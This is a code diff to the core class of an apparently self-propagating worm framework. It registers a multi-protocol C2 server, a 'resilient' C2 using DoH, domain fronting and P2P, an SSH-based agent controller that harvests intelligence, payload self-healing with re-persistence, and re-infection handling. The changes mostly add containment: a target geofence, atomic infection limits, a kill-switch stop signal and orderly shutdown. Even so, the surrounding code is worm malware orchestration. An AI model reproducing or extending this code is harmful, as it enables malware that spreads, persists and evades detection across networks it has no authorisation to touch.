@@ -130,13 +130,25 @@ class WormCoreBase:
                 parts = local_ip.split(".")
                 local_subnet = f"{parts[0]}.{parts[1]}.{parts[2]}.0/24"
                 if local_subnet not in self.config.safety.allowed_networks:
-                    self.config.safety.allowed_networks.append(local_subnet)
+                    # NOTE: the local subnet is NOT auto-added anymore. Auto-adding
+                    # it silently annulled the geofence (every run would whitelist
+                    # whatever network the operator happens to be on). Explicitly
+                    # configure safety.allowed_networks in the config file instead.
+                    logger.debug(
+                        f"Local subnet {local_subnet} not in allowed_networks "
+                        "(geofence evaluates TARGET IPs, not the local interface)"
+                    )
         except Exception:
             pass
 
         if not self.config.validate():
             logger.critical("Invalid configuration")
             sys.exit(1)
+
+        # Global cooperative stop signal + component registry. Initialized
+        # BEFORE any component is created so registration always works.
+        self.stop_event = threading.Event()
+        self._stoppable_components = []
 
         self.cli_monitor = None
         self.activity_bridge = None
@@ -216,6 +228,7 @@ class WormCoreBase:
         if C2_AVAILABLE:
             try:
                 self.c2_server = MultiProtocolC2(self.config)
+                self._stoppable_components.append(self.c2_server)
                 logger.info("C2 Server: enabled")
             except Exception as e:
                 logger.warning(f"C2 Server failed to initialize: {e}")
@@ -230,6 +243,7 @@ class WormCoreBase:
             from monitoring.web_dashboard import WebDashboard
 
             self.web_dashboard = WebDashboard(worm_core=self, host="0.0.0.0", port=5000)
+            self._stoppable_components.append(self.web_dashboard)
             logger.info("Web Dashboard: enabled (http://0.0.0.0:5000)")
         except Exception as e:
             logger.warning(f"Web Dashboard failed to initialize: {e}")
@@ -247,6 +261,7 @@ class WormCoreBase:
             self.armitage_dashboard = ArmitageDashboard(
                 worm_core=self, trainer=trainer, host="0.0.0.0", port=5001
             )
+            self._stoppable_components.append(self.armitage_dashboard)
             logger.info("Armitage Dashboard: enabled (http://0.0.0.0:5001)")
         except Exception as e:
             logger.warning(f"Armitage Dashboard failed to initialize: {e}")
@@ -318,6 +333,7 @@ class WormCoreBase:
 
             self.resilient_c2 = ResilientC2Engine(config=self.config)
             self.resilient_c2.start(start_p2p=True)
+            self._stoppable_components.append(self.resilient_c2)
             logger.info("Resilient C2 v2: enabled (DoH + DomainFronting + P2P + CommandQueue)")
         except Exception as e:
             logger.warning(f"Resilient C2 v2 failed: {e}")
@@ -358,15 +374,14 @@ class WormCoreBase:
             )
 
             def _on_dead(agent_session):
-                target = {
-                    "ip": agent_session.ip,
-                    "open_ports": [22, 445],
-                    "asset_value": agent_session.asset_value,
-                }
-                logger.warning(f"Agent {agent_session.ip} dead -- queuing re-infection")
-                self.exploit_queue.put(target) if hasattr(self, "exploit_queue") else None
+                target_ip = getattr(agent_session, "ip", None)
+                logger.warning(
+                    f"Agent {target_ip} dead -- re-infection requires manual trigger "
+                    "or the next propagation cycle (no exploit queue is active)"
+                )
 
             self.agent_controller.start_heartbeat_monitor(on_dead_agent=_on_dead)
+            self._stoppable_components.append(self.agent_controller)
             logger.info(
                 "Agent Controller v2: enabled (heartbeat, SSH pool, task queue, intel harvest)"
             )
@@ -382,6 +397,7 @@ class WormCoreBase:
                 payload_path=WORM_FILE_PATH,
             )
             self.advanced_self_healing.start(check_interval=120, launch_guardian=False)
+            self._stoppable_components.append(self.advanced_self_healing)
             logger.info(
                 "Advanced Self-Healing v2: enabled (integrity-check, re-persist, watchdog, cleanup)"
             )
@@ -704,6 +720,8 @@ class WormCoreBase:
         self.running = False
         self._detection_events: list = []
         self._data_lock = threading.RLock()
+        # stop_event / _stoppable_components are created at the TOP of
+        # __init__ (before any component) -- see there for comments.
 
         self.stats = {
             "scans": 0,
@@ -744,6 +762,25 @@ class WormCoreBase:
         with self._data_lock:
             self.infected_hosts.add(ip)
 
+    def check_and_add_infected(self, ip: str) -> bool:
+        """Atomically enforce max_infections + kill switch and register a host.
+
+        Returns True if the infection is admitted. This closes the TOCTOU gap
+        where concurrent threads/waves could overshoot max_infections between
+        the check and the set add.
+        """
+        with self._data_lock:
+            if self.kill_switch_activated or self.stop_event.is_set():
+                return False
+            max_inf = self.config.propagation.max_infections
+            if len(self.infected_hosts) >= max_inf:
+                logger.warning(f"Max infections reached: {max_inf}")
+                return False
+            if ip in self.infected_hosts:
+                return False
+            self.infected_hosts.add(ip)
+            return True
+
     def _safe_add_failed(self, ip: str):
         with self._data_lock:
             self.failed_targets.add(ip)
@@ -760,9 +797,26 @@ class WormCoreBase:
         with self._data_lock:
             return list(self.scan_results)
 
+    def is_target_allowed(self, ip: str) -> bool:
+        """Geofence for TARGETS: every candidate host IP must fall inside
+        safety.allowed_networks before any packet is sent to it.
+
+        (The old implementation only ever checked the operator's own local
+        interface IP, so it could never fail in practice.)
+        """
+        if not self.config.safety.geofence_enabled:
+            return True
+        from utils.network_utils import is_ip_in_range
+
+        for net in self.config.safety.allowed_networks:
+            if is_ip_in_range(ip, net):
+                return True
+        logger.warning(f"Geofence: target {ip} outside allowed_networks -- blocked")
+        return False
+
     def check_safety_constraints(self) -> bool:
-        if self.kill_switch_activated:
-            logger.log_kill_switch("Manual activation")
+        if self.kill_switch_activated or self.stop_event.is_set():
+            logger.log_kill_switch("Stop signal active")
             return False
 
         if len(self.infected_hosts) >= self.config.propagation.max_infections:
@@ -801,6 +855,7 @@ class WormCoreBase:
         if code == self.config.safety.kill_switch_code:
             logger.log_kill_switch("Correct code")
             self.kill_switch_activated = True
+            self.stop_event.set()
             self.shutdown()
         else:
             logger.warning("Invalid kill switch code")
@@ -808,12 +863,23 @@ class WormCoreBase:
     def self_destruct(self):
         logger.critical("SELF-DESTRUCT ACTIVATED")
         logger.info("Cleaning up...")
+        self.stop_event.set()
         self.shutdown()
 
     def shutdown(self):
+        """Stop every registered component and flush reports.
+
+        Does NOT call sys.exit(): from a worker thread SystemExit only kills
+        the thread, not the process. Callers decide how to terminate.
+        """
         logger.info("Shutting down")
         self.running = False
-        self.print_final_report()
+        self.stop_event.set()
+
+        try:
+            self.print_final_report()
+        except Exception as e:
+            logger.warning(f"Final report error: {e}")
 
         if self.config.ml.online_learning:
             try:
@@ -825,23 +891,13 @@ class WormCoreBase:
             except Exception as e:
                 logger.warning(f"Failed to save RL agent: {e}")
 
-        if self.c2_server:
+        # Stop every started component in reverse registration order.
+        for component in reversed(self._stoppable_components):
             try:
-                self.c2_server.stop()
+                component.stop()
             except Exception as e:
-                logger.warning(f"C2 server stop error: {e}")
-
-        if self.multi_operator:
-            try:
-                self.multi_operator.stop()
-            except Exception as e:
-                logger.warning(f"Multi-Operator stop error: {e}")
-
-        if self.icmp_tunnel:
-            try:
-                self.icmp_tunnel.stop()
-            except Exception as e:
-                logger.warning(f"ICMP tunnel stop error: {e}")
+                logger.warning(f"Component stop error ({component.__class__.__name__}): {e}")
+        self._stoppable_components.clear()
 
         if self.mitre_mapper:
             try:
@@ -851,4 +907,3 @@ class WormCoreBase:
                 logger.warning(f"MITRE report save error: {e}")
 
         logger.info("Shutdown complete")
-        sys.exit(0)
